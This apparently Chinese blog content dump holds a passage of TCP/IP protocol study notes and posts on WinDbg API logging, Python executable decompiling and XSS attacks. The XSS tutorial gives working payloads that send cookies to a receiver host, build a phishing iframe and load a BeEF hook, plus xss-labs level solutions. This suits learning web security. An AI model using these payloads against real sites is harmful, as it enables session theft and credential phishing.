为了保持简单和短小，采用UDP协议传输。主要有五种报文格式，如下图所示，头两个字节表示操作码，对应读请求和写请求，后续是文件名字段，以０字节结尾，随后是模式字段，主要分netascii 和octet ，前者表示是以成行的ascii 字段以及换行符组成，后者则是单纯以八位一字节的方式读取。块编号主要是用于确认分组使用，当服务器发送数据给客户端以后，客户端回复相应块编号的确认ack。此外还有一个差错报文，主要用于处理传输过程中的出错，从而停止传输。 ih 传输过程中，为了保证并行传输，只有第一个报文是采用的69端口，随后服务器进程会申请另一个端口进行数据传输。客户端的端口不会发生变化。 TFTP的安全性通过限制访问特定目录下的文件来保证。 15.2 习题（1）影响TFTP传输的因素 网络延迟 数据包丢失和重传 文件大小，文件过大会导致分片过多，从而影响传输效率 第16章 BOOTP：引导程序协议BOOTP 用于无盘系统进行系统引导。 分组格式如下：被封装在UDP数据报中。 BooTP的服务器端口是67 ，客户端端口是68，服务器应答可以广播。 BOOTP使用UDP，它为引导无盘系统获得它的 IP地址提供了除RARP外的另外一种选择。 BooTP服务器通过两种方式把响应送给客户，第一在高速ARP中设置一个条目，第二服务器广播。 16.2 习题 （1）如果在路由器中增加允许转发RARP请求的功能会发生什么？ 解决了转发请求还得解决转发响应。比较复杂。 第17章 TCP协议17.1 基本概念TCP提供一种面向连接的、可靠的字节流服务。 TCP可靠性的保证依靠以下条件： 分片 超时重传 收到数据包发送确认 校验和 重新排序 丢弃重复的数据 流量控制 TCP首部的格式如下 17.2 习题：（1） I P、I C M P、I G M P、U D P和T C P。每一种格式的首 部中均包含一个检验和。对每种分组，说明检验和包括 I P数据报中的哪些部分，以及该 检验和是强制的还是可选的。 答： IP 仅校验首部，UDP不是必须的。 （2）为什么校验和失败后丢弃处理？ 答：其他字段可能已经被破坏 （3）为什么TCP首部的开始便是源和目的端口？ 因为ICMP差错报文，包含了除了IP的前八个字节，因此为了提供源和目的端口来确认差错，TCP首部一开始便是源和目的端口。 第18章 TCP连接的建立与终止18.1 基础建立三次握手的过程 发送方A 发送SYN包给B，SYN置位，Seq&#x3D;0(相对数27928735) 接收方B 收到SYN包后，发送［SYN ACK］给A，SYN ACK置位，Seq&#x3D;0(相对位置3203894047，不同于发送方的Seq)， Ack&#x3D;1 (发送方的Seq+1 27928736) 发送方发送[ACK] 包，ACK置位，Seq&#x3D;1(27928736), Ack&#x3D;1(3203894048) 终止连接，四次挥手的过程 发送方A 发送[FIN ACK ] 包，置位FIN ACK ，Ack&#x3D;76(27928811)确认上次的包，Seq&#x3D;1(相对位置 3203894048) 接受方B 发送[ACk]包，置位ACK，Seq&#x3D;76(27928811)，ACK&#x3D;2（3203894049） 接受方B 发送[FIN ACK ] 包，置位FIN ACK ，Seq&#x3D;76(27928811)，ACK&#x3D;2（3203894049） 发送方A 发送[ACk]包，置位ACK，Seq&#x3D;2(3203894049)，ACK&#x3D;77（27928812） Time Wait 状态 主动关闭方在收到被动关闭方的FIN包后并返回ACK后，会进入TIME_WAIT状态，TIME_WAIT状态又称2MSL状态，每个TCP连接都必须有一个最大报文段生存时间MSL，在网络传输中超过这个时间的报文段将被丢弃。在此期间，定义这个连接的插口 （客户的I P地址和端口号，服务器的 I P地址和端口号）不能再被使用。这个连接只能在 2MSL 结束后才能再被使用。 以下是TCP的状态变迁图，可以清晰的看到TCP从Listen-&gt;ESTABLISHEND-&gt;FIN_WAIT_1-&gt;FIN_WAIT_2-&gt;TIME_WAIT-&gt;CLOSE的状态。 18.2 习题（1）半打开连接和半关闭连接的区别是什么？ 答： 半连接是发生在三次握手过程中，A向B发起连接，B也回应了，但是A不继续握手了。 半打开连接是正常连接通信过程中，一方异常关闭了，而另一方不知道的情况。 半关闭连接是其中一方发送了FIN包，但是另一方还没有发送FIN，因此还可以单向传输数据。 （2）服务器不将对客户 F I N的A C K与自己的F I N合并，从而将报文段数减 少为3个？ 答：第一 收到FIN后需要立即发送ack，但是服务器进程需要时间告诉TCP关闭这一连接；第二，服务器并不是收到FIN后，就一定想关闭连接，可能还有数据没有发送完。 （3）DNS采用TCP而不是UDP发送请求，每次查询需要多少个分组？ 答： 3个tcp连接，一个查询，一个确认查询，一个响应，一个确认响应，4个关闭连接，一共11个。 第20章 TCP的成块数据流20.1 基本概念（1）滑动窗口 滑动窗口协议是传输层进行流量控制的一种措施，接收方通过通告发送方自己的窗口大小，从而达到发送方的发送速度，以达到流量控制的目的。 滑动窗口解决了单个报文确认导致的通信效率低的问题。 窗口是不需要等待确认，可以连续发送数据包的最大值。 滑动窗口的累计确认原则还可以解决部分确认数据包丢失的问题，只要序号更大的数据确认包收到了，代表它之前的数据都收到了，不必重发。 发送端和接收端均存在一个窗口，发送端窗口大小不能超过接收端的窗口大小。针对发送窗口而言，实际就是发送端的一个缓冲区大小，在数据没有收到确认之前，缓冲区的数据不能被清空，发送窗口用完，就不能继续发送数据了，必须等待确认之后，清空缓存的数据，才可以继续发送数据。 （2）拥塞窗口 为了避免或者减小拥塞，TCP设计了一个拥塞窗口，发送窗口约等于拥塞窗口和接收窗口的最小值。拥塞窗口的原则是只要没有发生拥塞，窗口就不断增大，如何判断网络发生了拥塞，即没有收到ack报文，发生了超时重传，则认为发生了拥塞。这其中又涉及了四个算法慢启动（指数型）、拥塞避免（线性）、拥塞发生（减半+1）、快速恢复。 （3）PUSH标志 PUSH标志用于接收方告诉发送方将所收到的数据全部提交给接收进程。 20.2 习题（1）在一个Usenet记录中，有人抱怨说美国和日本之间的一个128 ms时延、速率为256 000 b&#x2F;s的链 路吞吐量为120 000 b&#x2F;s（利用率为4 7 %），而当链路通过卫星时其吞吐量则为33 000 b&#x2F;s（利用 率为1 3％）。试问在这两种情况下窗口大小各为多少（假定卫星链路的时延为500 ms）？卫星 链路的窗口大小应该如何调整？ 答： 第一种情况 120000*128&#x2F;1000&#x2F;8 &#x3D; 1920 字节，第二种情况是33000X500&#x2F;1000&#x2F;8&#x3D;2062字节 利用率为13%，那么最大情况应该是 2062&#x2F;13%&#x3D;15862 第21（22，23，24）章 TCP的超时和重传、坚持定时器、保活定时器、未来和性能21.1 基础TCP 提供可靠的运输层，其原因之一就是数据的发送与确认，TCP通过维护一个定时器来解决重传的问题。 TCP定时器 TCP 一共维持了4个定时器： 重传定时器: 分为超时重传和快速重传。重传定时器：超时重传时间的间隔存在一个倍乘关系，称之为“指数退避”。例如重传间隔时间分别为1，3，6，12，24，48，64，64，64，64，64…。快速重传则是在收到连续三个的确认包后发生的。 坚持定时器：为了避免因确认丢失，双方出现互相等待对方的情况，发送方使用一个坚持定时器来周期性的向接收方查看窗口是否增大。 保活定时器：在连接空闲两个小时后，在一个连接上发送一个探查分组来完成保活功能。可能会发生四种不同的情况：对端正常、对端崩溃（发送10个探查，间隔75S，对端无回应）、对端崩溃并重新启动（收到复位回应）、对端不可达（同对端崩溃）。 2MSL定时器：测量一个连接处于 TIME_WA I T状态的时间。 TCP拥塞措施 当网络处于饱和状态时，不必要的重传会增加网络的负载，因此一方面需要一个合适的RTT时间，另外一方面 TCP还提出了一系列的措施来避免网络拥塞，包括慢启动、拥塞避免、快速重传、快速恢复。 慢启动算法： 指数级增长，初始cwnd(拥塞窗口)&#x3D;1，每次接收到一个ack，cwnd &#x3D; cwnd*2 ，直至到慢启动门限 ssthresh。 拥塞避免：在此阶段，每经过一个RTT，cwnd&#x3D;cwnd+1 , 从指数增长变成线性增长。 此后就会出现丢包，就进入拥塞发生阶段，导致TCP重传。TCP重传有两大类：超时重传和快速重传。 超时重传发生后，ssthresh 变成cwnd的一半，随后继续慢启动cwnd&#x3D;1。 快速重传：快速重传会在收到三个重复的ack后发生，随后进入快恢复阶段。快恢复：cwnd（拥塞窗口） &#x3D; cwnd&#x2F;2，ssthresh &#x3D; cwnd，cwnd设置为ssthresh+3，重传丢失的数据包，继续收到重复的ack ，cwnd继续加1，当收到新的ack确认，快恢复结束，将cwnd的值设置为ssthresh。重新进入拥塞避免阶段。 补充： 除了快速重传外，还有SACK和DACK，在TCP的首部有这样一个字段SACK ，可以告诉发送方已经收到哪些数据包，应该重传哪些。DACK则是重复确认报文，告诉发送方是网络延迟还是确认报文丢失。 TCP新特征： TCP提供了新的特征： 路径MTU发现、窗口扩大选项、时间戳选项、序号回绕保护、以及改进的TCP事务处理。 路径MTU发现：路径MTU是在一条因特尔传输路径中，从源地址到目的地址所经过路径的最大传输单元的最小值。路径MTU发现技术则是确定两个主机之间最大传输单元的技术，目的是为了避免分片。其原理就是置位DF，逐步增大发送的数据包大小，直至出现ICMP差错响应，再减小发送的数据包大小，以此找到最佳的MTU。 窗口扩大选项：窗口扩大选项使得TCP窗口从16位变成32位，但是并没有修改TCP首部，而是通过定义一个选项来实现的，最大是14位，所以是2^16^14&#x3D;2^30，在发送SYN报文的时候发送这个选项，接受发送收到该选项后继续发送这个选项。 时间戳选项：在高速TCP连接中，32bit的序号可能很快就会用完一个轮回，时间戳选项可以用来甄别是不是属于上一个周期，同时可以使 T C P对报文段进行更加精确的 RTT测量。 序号回绕保护：本质实际上是利用 TCP Timestamp 选项的单调递增特性来识别老旧的报文，防止这些老旧报文的干扰。 改进的TCP 事务处理：绕过三次握手，缩短 WAIT_TIME状态，","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"python 开发xss 扫描工具","slug":"Web渗透/python 开发xss扫描器","date":"2024-02-18T16:00:00.000Z","updated":"2024-03-12T10:14:52.534Z","comments":true,"path":"2024/02/19/Web渗透/python 开发xss扫描器/","link":"","permalink":"http://zwjsfdbb.top/2024/02/19/Web%E6%B8%97%E9%80%8F/python%20%E5%BC%80%E5%8F%91xss%E6%89%AB%E6%8F%8F%E5%99%A8/","excerpt":"思路： 1、发送一个带有payload参数值的请求，从响应中判断是否存在Payload。（反射型） 2、准备字典文件作为payload 3、不同类型的payload 区别对待","text":"思路： 1、发送一个带有payload参数值的请求，从响应中判断是否存在Payload。（反射型） 2、准备字典文件作为payload 3、不同类型的payload 区别对待","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"windows 路径长度限制问题","slug":"编程/windows 路径长度限制","date":"2024-01-23T16:00:00.000Z","updated":"2024-03-12T14:37:41.515Z","comments":true,"path":"2024/01/24/编程/windows 路径长度限制/","link":"","permalink":"http://zwjsfdbb.top/2024/01/24/%E7%BC%96%E7%A8%8B/windows%20%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/","excerpt":"1、问题windows默认路径最大长度是260个字符，当程序遇到的路径超过260个字符时，就会出现windows Error3 错误，找不到对应的路径。 2、解决方法打开注册表 计算机\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem LongPathsEnabled 设置为 1 即可","text":"1、问题windows默认路径最大长度是260个字符，当程序遇到的路径超过260个字符时，就会出现windows Error3 错误，找不到对应的路径。 2、解决方法打开注册表 计算机\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem LongPathsEnabled 设置为 1 即可","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"监控API调用的windbg 插件 Logexts","slug":"逆向/监控API调用的windbg 插件 Logexts","date":"2024-01-16T16:00:00.000Z","updated":"2024-03-12T14:55:45.160Z","comments":true,"path":"2024/01/17/逆向/监控API调用的windbg 插件 Logexts/","link":"","permalink":"http://zwjsfdbb.top/2024/01/17/%E9%80%86%E5%90%91/%E7%9B%91%E6%8E%A7API%E8%B0%83%E7%94%A8%E7%9A%84windbg%20%E6%8F%92%E4%BB%B6%20Logexts/","excerpt":"1、背景 病毒分析时，对一些程序需要快速分析其功能，需要知道其API调用都有哪些，windbg 提供了一个插件可以实现这个功能，这个插件就是logexts。 2 使用介绍 !logexts.logi将Logger注入目标程序，初始化监控，但是并不开启它。 !logexts.loge开启监控，如果之前没有调用logexts.logi，这个扩展命令会先初始化监控，然后启动。 !logexts.logd停止监控。这个命令会摘掉所有的Hook，从而让程序自由运行。不过COM的Hook并不会被摘除。 !logexts.logo显示或者修改输出选项，这里有三种输出方式：1.在调试器中显示，2.输出到一个文本文件，3.输出到lgv文件。其中lgv文件会包含更多的信息，我们可以使用LogViewer进行查看。 !logexts.logc显示或者控制监控的API分类。 !logexts.logb显示或者刷新输出缓存。由于如果在监控过程中发生异常，那么扩展可能无法将记录的日志写入文件中，这个时候我们就需要这个命令，手动的将缓存中的数据写入文件。 !logexts.logm显示和创建模块的包含&#x2F;排除列表。这可以帮助我们指定记录那些特定模块中的API调用。","text":"1、背景 病毒分析时，对一些程序需要快速分析其功能，需要知道其API调用都有哪些，windbg 提供了一个插件可以实现这个功能，这个插件就是logexts。 2 使用介绍 !logexts.logi将Logger注入目标程序，初始化监控，但是并不开启它。 !logexts.loge开启监控，如果之前没有调用logexts.logi，这个扩展命令会先初始化监控，然后启动。 !logexts.logd停止监控。这个命令会摘掉所有的Hook，从而让程序自由运行。不过COM的Hook并不会被摘除。 !logexts.logo显示或者修改输出选项，这里有三种输出方式：1.在调试器中显示，2.输出到一个文本文件，3.输出到lgv文件。其中lgv文件会包含更多的信息，我们可以使用LogViewer进行查看。 !logexts.logc显示或者控制监控的API分类。 !logexts.logb显示或者刷新输出缓存。由于如果在监控过程中发生异常，那么扩展可能无法将记录的日志写入文件中，这个时候我们就需要这个命令，手动的将缓存中的数据写入文件。 !logexts.logm显示和创建模块的包含&#x2F;排除列表。这可以帮助我们指定记录那些特定模块中的API调用。 我一般用到的命令是 !logexts.loge 开启监控 !logexts.logo e * 三种日志输出方式都输出 另外windbg还支持调试子进程，可以尝试监控一下子进程的API调用，这个还没尝试。 3、使用过程截图 参考链接 https://0cch.com/2013/09/14/e4bdbfe794a8windbg-logextse79b91e68ea7e7a88be5ba8fapie8b083e794a8/ https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/using-the-debugger-and-logexts-dll?redirectedfrom=MSDN","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"xss 注入学习","slug":"Web渗透/xss注入","date":"2024-01-10T16:00:00.000Z","updated":"2024-03-12T11:17:56.446Z","comments":true,"path":"2024/01/11/Web渗透/xss注入/","link":"","permalink":"http://zwjsfdbb.top/2024/01/11/Web%E6%B8%97%E9%80%8F/xss%E6%B3%A8%E5%85%A5/","excerpt":"XSS注入1、引入xss 全称是跨站脚本攻击，核心是构造出能够让前端执行的JavaScript代码。测试php代码 test_xss.php 1234567891011&lt;?php if(isset($_GET[&#x27;content&#x27;])) &#123; $content = $_GET[&#x27;content&#x27;]; echo $content; &#125; else &#123; echo &quot;请输入URL地址参数 content&quot;; &#125;?&gt; 在地址栏输入如下，代码直接可以执行。 1http://localhost/test_xss.php/?content=&lt;script&gt;alert(1)&lt;/script&gt; javascript 执行的条件 代码位于 1&lt;script&gt;alert(1)&lt;/script&gt; 代码位于onclick、onmouseover等类似的事件 1&lt;button onclick=&quot;alert(1)&quot;&gt; 快来点我&lt;/button&gt; 代码位于超链接的href中 1&lt;a href=&quot;javascript:alert(1)&quot;&gt;点击有惊喜&lt;/a&gt; 示例： 基于XSS配置钓鱼网站：自行构造一个与淘宝一摸一样的页面，引诱用户登录后，发送给攻击者，再显示账号密码错误，重定向到真实的网站。 1234567http://192.168.101.10/test_xss.php/?content=&lt;iframe src=&#x27;https://taobao.com&#x27; width=100%height=100%&gt;&lt;script&gt; document.write(&#x27;你的用户名密码不正确，请重新登录&#x27;); setTimeout(function()&#123;location.href=&#x27;https://taobao.com&#x27;;&#125;,3000);&lt;/script&gt;","text":"XSS注入1、引入xss 全称是跨站脚本攻击，核心是构造出能够让前端执行的JavaScript代码。测试php代码 test_xss.php 1234567891011&lt;?php if(isset($_GET[&#x27;content&#x27;])) &#123; $content = $_GET[&#x27;content&#x27;]; echo $content; &#125; else &#123; echo &quot;请输入URL地址参数 content&quot;; &#125;?&gt; 在地址栏输入如下，代码直接可以执行。 1http://localhost/test_xss.php/?content=&lt;script&gt;alert(1)&lt;/script&gt; javascript 执行的条件 代码位于 1&lt;script&gt;alert(1)&lt;/script&gt; 代码位于onclick、onmouseover等类似的事件 1&lt;button onclick=&quot;alert(1)&quot;&gt; 快来点我&lt;/button&gt; 代码位于超链接的href中 1&lt;a href=&quot;javascript:alert(1)&quot;&gt;点击有惊喜&lt;/a&gt; 示例： 基于XSS配置钓鱼网站：自行构造一个与淘宝一摸一样的页面，引诱用户登录后，发送给攻击者，再显示账号密码错误，重定向到真实的网站。 1234567http://192.168.101.10/test_xss.php/?content=&lt;iframe src=&#x27;https://taobao.com&#x27; width=100%height=100%&gt;&lt;script&gt; document.write(&#x27;你的用户名密码不正确，请重新登录&#x27;); setTimeout(function()&#123;location.href=&#x27;https://taobao.com&#x27;;&#125;,3000);&lt;/script&gt; 2、测试步骤（多为反射型）（1）找到输入点，输入任意字符，查看输出位置 （2）打开网页源代码，在源代码中查找输出的位置 （3）查看输出位置的内容与输入的内容的关系，构建闭合和拼接脚本 （4）利用 onclick alert(1) 进行测试，确认是否存在注入点 （5）开始利用该注入点，执行复杂操作 示例 123正常输入 // &lt;input type=&quot;text&quot; id=&quot;content&quot; value=&quot;123&quot;/&gt; value = 123注入测试输入 // &lt;input type=&quot;text&quot; id=&quot;content&quot; value=&quot;123&quot; onclick=&quot;alert(1)&quot;/&gt; value= 123&quot; onclick=&quot;alert(1) //&lt;input type=&quot;text&quot; value=&quot;123&quot;/&gt; &lt;!--&quot; id=&quot;content&quot;&gt; value = 123&quot;/&gt; &lt;!-- 直接闭合标签，注释后面的 3、测试样例123456789101112131415161718192021&lt;!--test1 点击图片跳转到baidu&lt;img src=&quot;./123.png&quot; onclick=&quot;location.href=\\&#x27;https://www.baidu.com\\&#x27;&quot;&gt;xxxx1111111111&lt;!-- test2 点击图片发送当前cookies和url 到特定服务器 + 用%2B代替 &amp; 用%26 代替&lt;a href=\\&#x27;javascript:location.href=&quot;http://192.168.101.10/learn/xssrecv.php?url=&quot;%2Blocation.href%2B&quot;%26cookie=&quot;%2Bdocument.cookie\\&#x27;&gt;&lt;img src=&quot;http://192.168.101.100/learn/123.png&quot;/&gt;&lt;/a&gt;&lt;!-- test3 无需点击，加载就发送请求&lt;script&gt; new Image().src=&quot;http://192.168.101.100/learn/xssrecv.php?url=&quot; %2B location.href %2B &quot;%26cookie=&quot; %2B document.cookie;&lt;/script&gt; 4、xss receiver 部署bluelotus 是一个 xss漏洞接收平台，可通过docker 直接部署。 1234docker search bluelotusdocker pull tanyiqu/bluelotus_xss_receiverdocker run -dt --name bluelotus -p 8888:80 --rm tanyiqu/bluelotus_xss_receiver 正常安装以后登录bluelotus 平台，界面如下，在我的JS那里，选择新增你想要的JS，可以选公共模板，然后进行更改，点击下方新增后，再点击生成payload，复制生成的到你目标站点即可，在接收面板等待接收。 5、XSS利用方式（1）、获取用户Cookie 实现越权（2）、钓鱼网站，模拟真实的网站的登录页面，获取用户信息再跳转到真实网站（3）、执行JS代码，用于DDos 攻击别的目标站点（4）、 恶意链接让用户点击，或者直接将网页植入到站点的iframe标签（5）、当用户点击并访问到恶意站点 在xx.html 中可以执行JS代码，提供正常网站功能的同时，执行隐蔽的恶意代码，如挖矿 6、XSS的类型（1）、反射性 可用扫描器，数据流向 浏览器->后端->浏览器 简单描述 输入的内容在页面原样输出 反射型xss是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特有的恶意代码参数被HTML解析、执行。它的特点是非持久化，必须用户点击带有特定参数的链接才能引起。 （2）、存储型 会存储到数据库 如评论等 浏览器->后端-> 数据库->后端->浏览器 最典型的应用就是留言板XSS，用户提交了一条包含XSS代码的留言，然后被存储到数据库中，当有用户查询留言时，从数据库中读取的留言内中的代码就会被浏览器当作JS解析执行。 （3）、DOM型 阅读JS代码，如何输入，如何闭合 URL->浏览器，不经过服务器 利用的步骤与反射性相似，需要诱使受害者访问我们构造的URL，但是URL参数不会发送给服务器， 示例 ： 1234567891011121314151617&lt;html&gt; &lt;head&gt; &lt;title&gt; DOM-XSS TEST &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var hash = location.hash; if(hash)&#123; var url = hash.substring(1); location.href = url; &#125; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;# payloadhttp://192.168.101.100/Dom_xss.html#javascript:alert(1) Location.hash 返回URL从#到结束的数据，该html的script 中代码 本意是通过# 后面的值来控制跳转，但是因为跳转部分参数是可控的，因此存在DOM XSS漏洞，将参数写在#号后，既可以让JS读取到参数，又不会传到服务器。 7、XSS的防御（1）、htmlspecialchar()函数对用户的输入进行处理，把特殊符号转换成实体编码（2）、正则表达式以及字符串判断 8、XSS的绕过（1）、前端直接修改JS代码（2）、字符串过滤，双写、大小写、注释等（3）、HTML实体转换（4）、测试是否被过滤转义，若无则直接（5）、输出在script标签内，在保证内部JS语法正确的前提下，去插入payload（6）、输出在HTML属性内，首先查看属性是否有双引号包裹，没有则直接添加新的事件属性，有则测试双引号是否可用，而可用则闭合属性后添加新的事件属性（7）、输出在JS中，空格被过滤可用/**/代替空格（8）、输出在JS注释中，设法插入%0A、%0D使其逃逸（9）、输出在JS字符串内，可以利用JS的十六进制，八进制，unicode编码（10）、输出在src href action等属性内，可以利用JavaScript:alert(1),以及data:text;base64;加上base64编码后的html(11)、payload在特定标签，如,,,,,,中，JS不会被解析，除非我们将其闭合 9、XSS闯关实验靶场环境：https://github.com/do0dl3/xss-labs (1) 第一关 http://localhost/xss-labs/level1.php?name=alert(1) (2) 第二关 输出在两个位置都有，一个被转换，一个没有，故可以构造闭合，payload&#x3D; “ onclick&#x3D;”alert(1) (3)、第三关 单引号实现闭合 payload &#x3D; ‘ onclick&#x3D;’alert(1) (4)、第四关 双引号闭合 payload &#x3D; “ onclick&#x3D;”alert(1) (5)、第五关 onclick 会被替换成o_nclick, 会被替换成 ，改用超链接 payload&#x3D;”&#x2F;&gt;点我a&gt; （6）、第六关 onclick script href 都被替换 ，大小写绕过 payload &#x3D; “ Onclick&#x3D;”alert(1) (7)、第七关 onclick 的on会被替换 更改on为oonn payload &#x3D; “ oonnclick&#x3D;”alert(1) (8) 、第八关 输入的内容会在href 里面出现，但是javascript 会被替换成javascr_pt，可通过实体转换的方式来解决 javascript:alert(1) 的实体编码： 1&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41; （9）、第九关 会对http 链接进行检查，实际是检查输入字符串中是否存在http:&#x2F;&#x2F; payload &#x3D; javascript:alert(1);&#x2F;&#x2F; 的实体编码加http:&#x2F;&#x2F; 记住要加&#x2F;&#x2F; 注释掉http:&#x2F;&#x2F; 不然不会弹框 (10)、第十关 直接修改隐藏的form 表单，修改type 属性为text , 添加提交按钮 1234567891011&lt;input name=&quot;t_link&quot; value type=&quot;text&quot;&gt;&lt;input name=&quot;t_history&quot; value type=&quot;text&quot;&gt;&lt;input name=&quot;t_sort&quot; value type=&quot;text&quot;&gt;&lt;button&gt;提交&lt;/button&gt;分别三个框输入&quot; onclick=&quot;alert(1)&lt;input name=&quot;t_link&quot; value type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value= onclick=&quot;alert(1)&quot; type=&quot;hidden&quot;&gt;再次修改 t_sort的type 为button 点击button (11) 第十一关 12更改refer 为hello&quot; onclick=&quot;alert(1)&quot; type=&quot;button （12）第12关 12更改UA 为hello&quot; onclick=&quot;alert(1)&quot; type=&quot;button （13）第十三关 12更改Cookieuser=hello&quot; onclick=&quot;alert(1)&quot; type=&quot;button (16)第十六关 1http://192.168.101.100/xss-labs/level16.php?keyword=%3Cbutton%0Aonclick=%22alert(1)%22%3Eupload (17) 第十七关 1http://192.168.101.100/xss-labs/level17.php?arg01=a&amp;arg02=b%20onmouseover=alert(1) （18） 第十八关 1http://192.168.101.100/xss-labs/level18.php?arg01=a&amp;arg02=b%20onmouseover=alert(1) 10、 XSS 漏洞扫描工具（1）XSSTrike https://github.com/s0md3v/XSStrike.git get 请求测试 1python3 xsstrike.py -u http://192.168.101.100/xss-labs/level2.php?keyword=test 测试URL路径 1python3 xsstrike.py -u http://192.168.101.100/xss-labs/level2.php --path 爬取网站的网页进行测试 1python3 xsstrike.py -u http://192.168.101.100/xss-labs/level2.php --crawl 查找隐藏参数 1python3 xsstrike.py -u http://192.168.101.100/xss-labs/level2.php --params (2) burp 设置好代理以后，target 会自动爬取当前浏览器网页内容，点击scan，选择爬取和审计，即可得到扫描结果。 (3) beef-xss 平台 kaili 2023 安装 beef-xss 过程 12apt-get updateapt-get install beef-xss 安装后直接运行beef-xss，第一次会提示修改密码，修改后启动beef-xss 服务，Web UI 等。利用时将 放入存在xss漏洞的位置即可。 利用xss-labs 的第一关来测试一下 1http://192.168.101.100/xss-labs/level1.php?name=11&quot; &lt;script src=&quot;http://192.168.101.7:3000/hook.js&quot;&gt;&lt;/script&gt; 随后在beef-xss的web页面上看到，利用成功。当然了beef-xss平台有很多功能，接下来继续探索。","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"exe反编译python","slug":"逆向/exe 反编译python","date":"2024-01-08T16:00:00.000Z","updated":"2024-03-12T16:00:33.863Z","comments":true,"path":"2024/01/09/逆向/exe 反编译python/","link":"","permalink":"http://zwjsfdbb.top/2024/01/09/%E9%80%86%E5%90%91/exe%20%E5%8F%8D%E7%BC%96%E8%AF%91python/","excerpt":"1、前言python 可通过pyinstaller 以及py2exe 编译脚本为exe，下面主要针对这两种方式生成的exe进行反编译。 2、反编译过程2.1 pyinstaller 编译的exe提取过程python版本要与实际脚本的python版本一致，python版本可用16进制工具查看exe文件。 2.1.1 exe 转成pyc文件有个开源脚本pyinstxtractor 可以把exe 转成pyc文件，另外还有个pyi-archive_viewer 也可以用，不过每次只能处理一个文件，不如pyinstxtractor 好用。 2.1.2 pyc 转 py 在线网站可转 http://tools.bugscaner.com/decompyle/ https://www.lddgo.net/string/pyc-compile-decompile 第三方库 uncompyle6 pip install uncompyle6 第三方库 pycdc uncompyle 对python3.10 以上版本支持不太好，可换为pycdc 12345678910111213141516171819202122# 安装过程git clone https://github.com/zrax/pycdc.gitcmake .make ./pycdc pycfile# 遇到错误：Unsupported opcode: JUMP_IF_NOT_EXC_MATCH #查找资料，看雪上有人给出了解决办法 https://www.52pojie.cn/thread-1649244-1-1.html# 找到源码 ASTree.cpp 查找Unsupported opcode #添加以下代码```case` `Pyc::JUMP_IF_NOT_EXC_MATCH_A:case` `Pyc::RERAISE_A:case` `Pyc::WITH_EXCEPT_START: ``break``;```#临时解决而已。 2.2 py2exe 编译成的exe","text":"1、前言python 可通过pyinstaller 以及py2exe 编译脚本为exe，下面主要针对这两种方式生成的exe进行反编译。 2、反编译过程2.1 pyinstaller 编译的exe提取过程python版本要与实际脚本的python版本一致，python版本可用16进制工具查看exe文件。 2.1.1 exe 转成pyc文件有个开源脚本pyinstxtractor 可以把exe 转成pyc文件，另外还有个pyi-archive_viewer 也可以用，不过每次只能处理一个文件，不如pyinstxtractor 好用。 2.1.2 pyc 转 py 在线网站可转 http://tools.bugscaner.com/decompyle/ https://www.lddgo.net/string/pyc-compile-decompile 第三方库 uncompyle6 pip install uncompyle6 第三方库 pycdc uncompyle 对python3.10 以上版本支持不太好，可换为pycdc 12345678910111213141516171819202122# 安装过程git clone https://github.com/zrax/pycdc.gitcmake .make ./pycdc pycfile# 遇到错误：Unsupported opcode: JUMP_IF_NOT_EXC_MATCH #查找资料，看雪上有人给出了解决办法 https://www.52pojie.cn/thread-1649244-1-1.html# 找到源码 ASTree.cpp 查找Unsupported opcode #添加以下代码```case` `Pyc::JUMP_IF_NOT_EXC_MATCH_A:case` `Pyc::RERAISE_A:case` `Pyc::WITH_EXCEPT_START: ``break``;```#临时解决而已。 2.2 py2exe 编译成的exe2.2.1 工具直接反编译 github 有个比较老的工具了，python-exe-unpacker，集合了pyinstxtractor和py2exe，可以先试试。 2.2.2 手工解包 Py2exe打包的exe程序有三部分组成，分别是PYTHONxx.dll(xx是版本号，比如27), PYTHONSCRIPT, library.zip。PYTHON27.dll应该就是python的运行环境了。PYTHONSCRIPT是程序开始执行的入口，如main函数。libarary.zip中是程序用到的库文件，包括自带的库和用户自己写的库文件。 破解程序的时候需要处理的文件就是PYTHONSCRIPT和library.zip。 使用Py2exe Bynary Editor(以下简称pbe) 可以简单的将Py2exe打包的程序dump成原来的三个文件，也可以将修改后的文件再打包回去。使用界面如图。 针对library.zip 中的文件可直接用uncompyle6反编译一般不会有什么问题。 针对 PYTHONSCRIPT，则需要先进行一些处理 获取code bytes 